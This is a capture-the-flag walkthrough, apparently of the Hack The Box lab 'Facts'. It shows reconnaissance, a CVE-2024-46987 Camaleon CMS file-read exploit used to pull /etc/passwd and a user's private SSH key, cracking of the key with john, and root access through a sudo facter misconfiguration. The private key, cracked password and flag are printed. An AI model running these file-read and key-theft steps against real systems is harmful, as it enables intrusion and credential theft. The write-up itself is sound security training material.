## Machine Facts (Active) 

Let's start with a classic nmap scan : 
```
    ❯ nmap 10.129.2.87
    Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-19 13:42 +0100
    Nmap scan report for facts.htb (10.129.2.87)
    Host is up (0.45s latency).
    Not shown: 998 closed tcp ports (reset)
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http

```

a web interface and an ssh port, alr, now lets scan for subdomains;
```
    ffuf -u http://facts.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.facts.htb" -fc 302 -s
```
- no results, alr. \

![alt text](image.png) \
after some testing , I did a directory scan , and lucky enough, i found /admin/register and /admin/login. \
and there we are !\
![alt text](image-1.png)\
let's start looking around
well ... funny enough, a CVE XD \
![alt text](image-2.png)\
that works on the exact version of Camaleon CMS that the website works on!\
**CVE-2024-46987 - Camaleon CMS Authenticated Arbitrary File Read**
\
```
❯ python3 CVE-2024-46987.py -u http://facts.htb -l testUser -p testPass /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
```
it does work, great , lets look for some ssh credentials or anything helpful.
we can identify to users login from here :
william and trivia, lets try to read their ssh keys;
```
    ❯ python3 CVE-2024-46987.py -u http://facts.htb -l testUser -p testPass /home/trivia/.ssh/authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHo8pTlS+u7EyH71mo6/cuZgNi4spEuZNxhnr8kUcKSw 

```
great !, so its a ed25519 key, let's grab it :
```
❯ python3 CVE-2024-46987.py -u http://facts.htb -l testUser -p testPass /home/trivia/.ssh/id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCJMOgfHz
5vSs6ehGefHdXHAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIHo8pTlS+u7EyH71
mo6/cuZgNi4spEuZNxhnr8kUcKSwAAAAoJ0MJI+9YoybI+yny/IVQxFToFp8TniGrMTTZv
KfrDuNZdZ4Gf1GANl7zwklBjUfC6FJjHVR9pxjb9GBEMTavZxEnUEl7ml3MbgGJHmYDEui
bXJDkxIKQiW4kX7D/gnl6j+Iau2kN+gaQsK/xRrLEjoQozQeFWCt1AAZIXSWAceAsWr2/n
GIFPgSL1UooxWlg744RSJ7sNNRboYyjhNAQk4=
-----END OPENSSH PRIVATE KEY-----
```
now we need to crack it :
```
ssh2john id_ed25519 > id_ed25519.hash
john id_ed25519.hash --wordlist=/usr/share/wordlists/rockyou.txt
```
we got a password ! ``` dragonballz ``` , lets ssh in

and we are in ! \
![alt text](image-4.png)\

```
trivia@facts:~$ find / -name user.txt 2>/dev/null
/home/william/user.txt
^C
trivia@facts:~$ cat /home/william/user.txt
87406b28694273b2278ea602572efd8e
``` 
user flag DONE.

now let's go for the root's flag; lets look for any priv esc vector : \

![alt text](image-3.png)\
lets check what does this "facter" do :
from what i read online, facter looks for ruby files to collect information, for example : 
```
Facter.add('myfact') do
  setcode do
    'hello world'
  end
end
```
facter will come here and execute the setcode part (which is hello world),
so since its running root, we can make it execute a shell as root, so we'll just create a ruby file containing a setcode that executes opening a shell and check it with facter, and like that we should get a root shell:\
![alt text](image-6.png)\
and there we are !\
![alt text](image-7.png)\
hehe